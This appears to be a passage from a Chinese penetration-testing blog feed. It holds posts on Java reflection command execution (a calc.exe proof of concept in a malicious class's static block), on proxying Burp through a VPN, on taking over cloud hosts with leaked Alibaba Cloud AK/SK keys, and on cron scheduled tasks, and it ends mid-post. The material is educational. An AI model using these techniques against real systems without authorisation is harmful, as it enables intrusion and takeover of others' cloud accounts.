class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">userClass</span> <span class="operator">=</span> Class.forName(<span class="string">"com.Anchor.User"</span>); <span class="comment">//获得一个class实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> userClass.getMethod(<span class="string">"setName"</span>, String.class); <span class="comment">// 通过class实例获得User类中的setName方法</span></span><br><span class="line">        System.out.println(<span class="string">"获得的Method对象为:"</span> + method);</span><br><span class="line">        method.invoke(userClass.newInstance(), <span class="string">"anch0r"</span>);<span class="comment">// 实例化一个user对象并触发它的setName方法，传入的参数值为anch0r</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为了体现调用setName方法的效果我们将User类中的setName方法改造如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> {</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    System.out.println(<span class="built_in">this</span>.getName());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出结果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得的Method对象为:<span class="keyword">public</span> <span class="keyword">void</span> com.Anchor.User.setName(java.lang.String)</span><br><span class="line">anch0r</span><br></pre></td></tr></tbody></table></figure><p>可以看到name的值在运行过程中被设置为anch0r，代表setName方法调用成功。</p><p>Class类获取Method对象还有下面几个方法：</p><table><thead><tr><th>方法返回值</th><th>方法名称</th><th>方法说明</th></tr></thead><tbody><tr><td>Method[]</td><td>getMethods()</td><td>返回一个包含某些 Method 对象的数组，这些对象反映此 Class 对象所表示的类或接口（包括那些由该类或接口声明的以及从超类和超接口继承的那些的类或接口）的公共 member 方法。</td></tr><tr><td>Method</td><td>getDeclaredMethod(String name, Class&lt;?&gt;… parameterTypes)</td><td>返回一个指定参数的Method对象，该对象反映此 Class 对象所表示的类或接口的指定已声明方法。</td></tr><tr><td>Method[]</td><td>getDeclaredMethods()</td><td>返回 Method 对象的一个数组，这些对象反映此 Class 对象表示的类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</td></tr></tbody></table><h2 id="0x03-java反射的价值"><a href="#0x03-java反射的价值" class="headerlink" title="0x03 java反射的价值"></a>0x03 java反射的价值</h2><p>看到这里，也许你会疑惑，还是没有看到java反射的利用价值，光能调用成员函数有什么用？</p><p>那就来个命令执行的演示。我们来通过反射Runtime类实现命令执行。</p><p>上代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>); <span class="comment">// 得到Runtime的class对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> evilClass.getMethod(<span class="string">"exec"</span>, String.class); <span class="comment">// 从中获取exec方法的method实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> evilClass.getMethod(<span class="string">"getRuntime"</span>); <span class="comment">//从中获取getRuntime方法的method实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">evil</span> <span class="operator">=</span> runtimeMethod.invoke(evilClass); <span class="comment">//调用getRuntime方法从而获得一个Runtime类对象</span></span><br><span class="line">        method.invoke(evil, <span class="string">"calc.exe"</span>); <span class="comment">// 调用exec方法，运行exec命令，打开一个计算机</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>核心是通过forName将Runtime类的class对象加载到内存中然后通过getMethod调用exec方法，进行命令执行。中途还需要通过getRuntime方法获得一个Runtime类对象。</p><p>成功执行命令，打开计算器</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223225322520.png" alt="成功打开计算器"></p><h2 id="0x04-forName的两种重载"><a href="#0x04-forName的两种重载" class="headerlink" title="0x04 forName的两种重载"></a>0x04 forName的两种重载</h2><p>在平时，除了系统类，如果我们需要用一些类，除非有import导入，否则我们只能通过forName加载我们需要类的Class对象。</p><p>Class.java文件中显示，forName有两种重载方式，</p><p>第一种是用的最多的，参数只需要全限定类名即可</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; forName(String className)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223231730569.png" alt="第一种forName重载方式"></p><p>第二种</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223231913552.png" alt="第二种forName重载方式"></p><p>第二种重载方式涉及另外两个参数，initialize和loader，loader需要传入一个ClassLoader类的对象，即类加载器，这个留到之后一篇文章详解，本篇暂且不谈。initialize要传入布尔值，代表是否初始化。</p><p>需要注意的是，第一种重载方式是第二种重载方式的一个特殊情况，即下面这两个forName是等价的：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className) <span class="comment">//第一种重载方式</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)  <span class="comment">//第一种相当于第二种重载方式选择初始化</span></span><br></pre></td></tr></tbody></table></figure><p>那么这里的是否初始化到底代表什么？</p><p>想到初始化，第一个想到的就是构造函数，那就是会执行相应的构造函数？然后并非如此。</p><p>p神指出该初始化是告诉虚拟机是否执行”类的初始化“(类初始化是指类第一次加载到内存进程中要进行的操作)。</p><p>类在初始化的时候会调用其中的<code>static{}</code>，即static块。那么我们可以通过将恶意代码放置在恶意类的static块中，通过<code>forName</code>加载该恶意类（选择第一种重载方式，默认“类初始化”），从而实现命令执行。</p><p>我们设计主函数如下，其中定义一个可以获取类的class对象的函数<code>reflection</code></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reflection</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        reflection(<span class="string">"com.Anchor.Evil"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后构造恶意类 <code>Evil</code></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> {</span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">"calc.exe"</span>;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(command);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>执行Main函数,成功弹出计算器。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231223235137881.png" alt="成功弹出计算器"></p><p>假设reflection中的传入的参数可控，那么我们就可以像这样传入自己构造好的恶意类，达到命令执行效果。</p><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>本篇只是初步从java反射角度了解java的一些底层原理，远没有涉及到实际的利用场景。其实利用好java反射机制，可以很好的绕过安全机制，这就涉及更深的内容了，本篇暂时不涉及，留到以后的篇幅去探索。</p><p><strong>参考文章：</strong></p><p><a href="https://github.com/phith0n/JavaThings">《java安全漫谈》</a></p><p><a href="https://xz.aliyun.com/t/9117#toc-0">JAVA安全基础（二）– 反射机制</a></p><p><a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html#method%E7%B1%BB%E5%8F%8A%E5%85%B6%E7%94%A8%E6%B3%95">Java 基础 - 反射机制详解</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记在vpn中通过burp抓包的一个小问题</title>
      <link href="/2023/12/20/%E8%AE%B0%E5%9C%A8vpn%E4%B8%AD%E9%80%9A%E8%BF%87burp%E6%8A%93%E5%8C%85%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/"/>
      <url>/2023/12/20/%E8%AE%B0%E5%9C%A8vpn%E4%B8%AD%E9%80%9A%E8%BF%87burp%E6%8A%93%E5%8C%85%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B0%8F%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p>​    一次对远程内网系统的渗透，通过深信服vpn连过去的，发现通过burpsuite代理抓包，根本无法实现数据交互，抓包放包后访问系统始终出现Burp Suite Professional error Connection refused 的报错页面，爆破登录框，也始终得不到返回包，将burp代理关闭才能正常访问系统。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220225336186.png" alt="连接深信服vpn"></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220232035102.png" alt="通过burp代理，无法正常访问系统"></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220232135277.png" alt="关闭burpsuite代理后才能正常访问网站"></p><h2 id="0x02-原因"><a href="#0x02-原因" class="headerlink" title="0x02 原因"></a>0x02 原因</h2><p>正常数据流一般是：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地网络 --&gt; 客户端浏览器 --&gt; burpsuite代理 --&gt; 目标服务端</span><br></pre></td></tr></tbody></table></figure><p>连接了vpn之后，数据流向如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vpn网络 --&gt; 客户端浏览器 --&gt; burpsuite代理 --&gt; 目标vpn网络 --&gt; 目标服务端</span><br></pre></td></tr></tbody></table></figure><p>大概率是vpn从中拦截了burpsuite的发包，所以导致无法实现数据交互，会一直收不到返回包。</p><h2 id="0x03-解决方法"><a href="#0x03-解决方法" class="headerlink" title="0x03 解决方法"></a>0x03 解决方法</h2><p>我们只需要使用ew代理软件，开个socks服务进行本地转发即可，<a href="https://github.com/idlefire/ew">ew下载地址</a>。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 9999</span><br></pre></td></tr></tbody></table></figure><p>端口为9999</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220233426994.png" alt="使用ew工具进行本地转发"></p><p>然后打开burp，在<code>User options</code>中添加SOCKS Proxy代理</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220233938648.png" alt="burpsuite上设置好socks代理"></p><p>可以看到终于可以通过burp代理正常访问远程系统了</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231220234209314.png" alt="通过burp代理正常实现数据包交互"></p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云渗透之AK/SK泄露利用</title>
      <link href="/2023/12/17/%E4%BA%91%E6%B8%97%E9%80%8F%E4%B9%8BAK-SK%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/"/>
      <url>/2023/12/17/%E4%BA%91%E6%B8%97%E9%80%8F%E4%B9%8BAK-SK%E6%B3%84%E9%9C%B2%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="云概念"><a href="#云概念" class="headerlink" title="云概念"></a>云概念</h3><p>   “云”的概念涉及到云计算，云计算的基本概念是将计算机处理和存储能力从本地环境（如个人电脑或本地服务器）转移到远程的服务器集群上，这些服务器通过互联网连接在一起。用户可以通过互联网访问这些服务器上的应用程序、数据和服务，而无需担心管理和维护底层的基础设施。</p><p>​    在我看来，自己购买服务器或租用服务器，成本高、不安全，频繁面临ddos等攻击的风险，而云平台成本更低，可扩展性强，安全性，方便管理，同时提供更好的数据备份和容灾能力，这也就是为什么越来越多的中小企业选择云平台的原因。</p><p>​    说白了，就是将机子部署到云端。所以云端的渗透的思路本质上和常规渗透思路没有太大区别，也是基本的渗透测试流程，只是多了一些新的概念，除了常规的渗透测试方式，也多了些新的可以利用的漏洞。本文涉及的是AK/SK泄露利用，其实就是敏感配置信息泄露的后续利用方式。</p><h3 id="云的相关术语"><a href="#云的相关术语" class="headerlink" title="云的相关术语"></a>云的相关术语</h3><h4 id="RDS"><a href="#RDS" class="headerlink" title="RDS"></a>RDS</h4><ul><li>关系型数据库服务（Relational Database Service，简称 RDS）是一种稳定可靠、可弹性伸缩的在线数据库服务。</li><li>RDS 采用即开即用方式，兼容 MySQL、 SQL Server 两种关系型数据库，并提供数据库在线扩容、备份回滚、性能监测 及分析功能。</li><li>RDS 与云服务器搭配使用 I/O 性能倍增，内网互通避免网络瓶颈。</li></ul><h4 id="对象存储-OSS（理解为网盘）"><a href="#对象存储-OSS（理解为网盘）" class="headerlink" title="对象存储 OSS（理解为网盘）"></a>对象存储 OSS（理解为网盘）</h4><p>   OSS 是对象存储服务（Object Storage Service）的缩写，是阿里云（Alibaba Cloud）提供的一种高度可扩展的云存储服务。对象存储是一种用于存储和检索大量非结构化数据的技术，例如图片、视频、文档、备份文件等。</p><p>OSS存在如下的访问控制机制：</p><ul><li><p>对 OSS 的资源访问分为拥有者访问、第三方用户访问。这里的拥有者指的是 Bucket 的拥有者，也称为开发者。</p></li><li><p>第三方用户是指访问 Bucket 里资源的用户。 访问又分为匿名访问和带签名访问。</p></li><li><p>对于 OSS 来说，如果请求中没有携带任何和身份相关的信息即为匿名访问。</p></li><li><p>带签名访问指的是按照 OSS API 文档中 规定的在请求头部或者在请求 URL 中携带签名的相关信息。</p></li><li><p>OSS 提供 Bucket 和 Object 的权限访问控制。</p></li></ul><p>关于oss的相关概念，比如Bucket和Object，具体可以看阿里云的说明文档：<a href="https://help.aliyun.com/zh/oss/product-overview/terms-2">OSS产品中涉及的基本概念_对象存储 OSS(OSS)-阿里云帮助中心</a></p><h4 id="ECS"><a href="#ECS" class="headerlink" title="ECS"></a>ECS</h4><ul><li>云服务器（Elastic Compute Service，简称ECS）</li></ul><h4 id="安全组"><a href="#安全组" class="headerlink" title="安全组"></a>安全组</h4><ul><li>安全组是一种虚拟防火墙，具备状态检测和数据包过滤功能，用于在云端划分安全域。</li><li>同一安全组内的ECS实例之间默认内网网络互通。</li></ul><h4 id="AK-SK"><a href="#AK-SK" class="headerlink" title="AK/SK"></a>AK/SK</h4><p>   云主机通过使用Access Key Id / Secret Access Key加密的方法来验证某个请求的发送者身份。Access Key Id（AK）用于标示用户，Secret Access Key（SK）是用户用于加密认证字符串和云厂商用来验证认证字符串的密钥，其中SK必须保密。 AK/SK原理使用对称加解密。</p><p>   云主机接收到用户的请求后，系统将使用AK对应的相同的SK和同样的认证机制生成认证字符串，并与用户请求中包含的认证字符串进行比对。如果认证字符串相同，系统认为用户拥有指定的操作权限，并执行相关操作；如果认证字符串不同，系统将忽略该操作并返回错误码。</p><p>   大部分云厂商都支持AK/SK的认证方式</p><p><strong>以阿里云为例：</strong></p><p>​      阿里云用户可以在管理控制台里自行创建 Access Key，Access Key是由AccessKey ID 和 AccessKey Secret 组成（即AK和SK）。</p><p>其中 ID 是公开的，用于标识用户身份，Secret 是秘密的，用于用户鉴别</p><p>当用户向 OSS 发送请求时，需要首先将发送的请求按照 OSS 指定的格式生成签名字符串；然后使用 AccessKey Secret 对签名字符串进行加密（基于HMAC 算法）产生验证码（验证码带时间戳，以防止重放攻击）。OSS 收到请求以后，通过 AccessKey ID 找到对应的 AccessKey Secret，以同样的方法提取签名字符串和验证码，如果计算出来的验证码和提供的一样即认为该请求是有效的；否则，OSS 将拒绝处理这次请求，并返回 HTTP 403 错误。</p><h2 id="AK-SK泄露利用"><a href="#AK-SK泄露利用" class="headerlink" title="AK/SK泄露利用"></a>AK/SK泄露利用</h2><h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>​       由于开发的不规范或者配置不当，以及一些其它漏洞，可能会导致AccessKey泄露，进而导致攻击者通过AKSK接管云主机。</p><p><strong>常见的渗透场景如下:</strong></p><ul><li><strong>APK文件中存放Access Key；</strong></li><li><strong>Web页面/JS文件等存在Access Key泄露</strong></li><li><strong>Github查找目标关键字发现Access Key与AccessKey Secret；</strong></li><li><strong>拥有WebShell低权限的情况下搜集阿里云Access Key利用；</strong></li></ul><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><p>常见的利用工具如下：</p><ul><li>OSS Browser</li><li>OSSUTIL</li><li>IDEA中的Big Data Tools插件</li><li>API Explorer</li><li>第三方平台 (如行云管家)</li></ul><p>其中OSS Browser、OSSUTIL、Big Data Tools只能对于OSS进行操作，API调试或者第三方写好的工具可以操控ECS。</p><p>连接oss时除了AK和SK，还需要OSS外网地址，格式一般如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://[Bucket名称].oss-区域.aliyuns.com  </span><br><span class="line">比如：https://xxxx.oss-cn-beijing.aliyuncs.com </span><br></pre></td></tr></tbody></table></figure><p>下面放一个真实案例：</p><p>拿到一个web服务器的shell，在其中翻找一些有用的配置文件，找到某个 .propertiespei配置文件，里面发现如下内容：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702793195694-80bf1b11-a860-462f-873d-ce5dc1458bb4.png" alt="配置文件泄露信息"></p><p>刚开始看到oss的url地址后，只想到了用oss连接的相关工具，但是连接oss只能对oss进行操作，除了看有没有敏感信息，没有多大用处。后来才发现oss的key也是AKSK形式，可以直接通过连接AKSK接管对应的云主机的，所以直接尝试用行云管家连接, 附上地址：<a href="https://yun.cloudbility.com/%E3%80%82">https://yun.cloudbility.com/。</a></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702793996910-6d1b3a00-c7e0-4bba-a3f3-9d052ee36b37.png" alt="指定云厂商"></p><p>直接选择阿里云,点击下一步，输入Api凭证，即拿到的AK和SK，即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image.png" alt="输入Api凭证"></p><p>可以看到能够接管如下很多主机实例：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/fix2.png" alt="所有主机实例"></p><p>添加后进入管理界面，尝试选择ssh连接云主机，发现还是需要密码的：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702794666313-d49d4e2d-4c9e-4d60-9b15-1290d5af0d63.png" alt="ssh连接需要密码"></p><p>但是可以进行重置操作系统密码和管理终端密码的操作（得确保取得客户授权后才能操作）</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702794576659-954c0b52-7ecc-4c2d-8362-16e78b066650.png" alt="重置操作"></p><p>除了用行云管家进行接管，还可以使用阿里云官方的api，达到执行命令的效果，具体可以参考下面这个链接：<a href="https://api.aliyun.com/#/?product=Ecs">阿里云OpenAPI开发者门户</a>，之前测试时没有留下截图，这里就不再次尝试了。</p><h3 id="自动化利用工具"><a href="#自动化利用工具" class="headerlink" title="自动化利用工具"></a>自动化利用工具</h3><p>在看其他人文章的时候，发现居然早就有佬已经写了阿里云api的利用工具，链接地址如下：</p><p><a href="https://github.com/iiiusky/alicloud-tools">GitHub - iiiusky/alicloud-tools: 阿里云ECS、策略组辅助小工具</a></p><p>通过该工具，利用获得的AKSK即可自动化执行上述的所有操作，包括查看所有实例信息、执行命令等等操作。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.moonsec.com/1098.html">云渗透思路</a></p><p><a href="https://www.freebuf.com/articles/web/337129.html">云主机AKSK泄露利用 - FreeBuf网络安全行业门户</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计划任务详解</title>
      <link href="/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/12/16/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="计划任务详解"><a href="#计划任务详解" class="headerlink" title="计划任务详解"></a>计划任务详解</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​      复现完若依后台的getshell的漏洞后，感觉计划任务这块内容用的还挺多的，除了刚刚复现的这个后台写入计划任务getshell，还有redis写入计划任务getshell，包括应急响应中也时常考虑计划任务那块是不是会有后门的存在。因为总是会疏忽计划任务这块内容，所以写这篇记录一下，顺便末尾再复现一下redis写入计划任务getshell。</p><h2 id="0x01-windows计划任务"><a href="#0x01-windows计划任务" class="headerlink" title="0x01 windows计划任务"></a>0x01 windows计划任务</h2><p>在“开始”处输入“任务计划程序”即可进入任务计划的程序界面，在该界面中可以看到目前所有已经创建的任务名，还可以自己创建任务、导入任务。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647411943-4d22f1b0-7bf3-460f-a83f-56d3d866760c.png" alt="任务计划程序"></p><p>创建任务时，会让你自己设置触发器，选择合适的时间时间，可以看出windows上设置计划任务还是挺方便的，不过很少有windows用户会用计划任务这块功能。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647716017-38f93752-5e24-4eb3-920b-8d831bcb9de2.png" alt="任务触发器选择"></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702647825532-eb1a375c-e473-44d7-8d88-89205a5ab889.png" alt="触发时间设置"></p><h2 id="0x02-linux计划任务"><a href="#0x02-linux计划任务" class="headerlink" title="0x02 linux计划任务"></a>0x02 linux计划任务</h2><p>重点还是在linux上，linux的计划任务还是经常使用的。</p><h4 id="关于cron"><a href="#关于cron" class="headerlink" title="关于cron"></a>关于cron</h4><p>linux内置了cron这个进程，它是linux下的定时执行工具，可以在无需人工干预的情况下运行作业。</p><p>我们经常使用的是crontab这条命令，它是cron table的缩写，它是cron的配置文件，也可以叫它作业列表，在以下文件夹内找到相关配置文件。</p><p>●/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，比如tom建的crontab任务对应的文件就是/var/spool/cron/tom。一般一个用户最多只有一个crontab文件。</p><p>●/etc/crontab 这个文件负责调度各种管理和维护任务。</p><p>●/etc/cron.d/ 这个目录用来存放任何要执行的crontab文件或脚本。</p><p>●我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p><p>一般在应急响应中可以通过看这几个文件或文件夹下的文件查看是否有写入恶意的计划任务。</p><h3 id="crontab常用命令"><a href="#crontab常用命令" class="headerlink" title="crontab常用命令"></a>crontab常用命令</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u user] file crontab [-u user] [ -e | -l | -r ]</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th>参数</th><th>参数意义</th></tr></thead><tbody><tr><td>-u user</td><td>用来设定某个用户的crontab服务</td></tr><tr><td>file</td><td>是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</td></tr><tr><td>-e</td><td>编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</td></tr><tr><td>-l</td><td>显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</td></tr><tr><td>-r</td><td>从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</td></tr><tr><td>-i</td><td>在删除用户的crontab文件时给确认提示。</td></tr></tbody></table><blockquote><p>crontab有如下注意点：</p><ol><li>crontab有2种编辑方式：直接编辑/etc/crontab文件与crontab –e，其中/etc/crontab里的计划任务是系统中的计划任务，而用户的计划任务需要通过crontab –e来编辑；</li><li>每次编辑完某个用户的cron设置后，cron自动在/var/spool/cron(kali是在/var/spool/cron/crontabs)下生成一个与此用户同名的文件，此用户的cron信息都记录在这个文件中，这个文件是不可以直接编辑的，只可以用crontab -e 来编辑。</li><li>crontab中的command尽量使用绝对路径，否则会经常因为路径错误导致任务无法执行。</li><li>新创建的cron job不会马上执行，至少要等2分钟才能执行，可重新启动cron来立即执行。</li><li>%在crontab文件中表示“换行”，因此假如脚本或命令含有%,需要使用%来进行转义。</li></ol></blockquote><h3 id="crontab配置"><a href="#crontab配置" class="headerlink" title="crontab配置"></a>crontab配置</h3><p>核心的内容肯定是crontab配置这块了。</p><p>用户所创建的crontab文件中，每一行都代表一项任务，每行的字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，具体的格式可以通过查看 /etc/crontab文件中的注释看到：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712259725-eaea7bff-df5e-4725-b02f-76c7b2b79866.png" alt="/etc/crontab"></p><p>可能看的不是很清晰，可以再看看下图：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/1702712495677-366dce47-d0a2-43b8-95a0-1271d53d9f07.png" 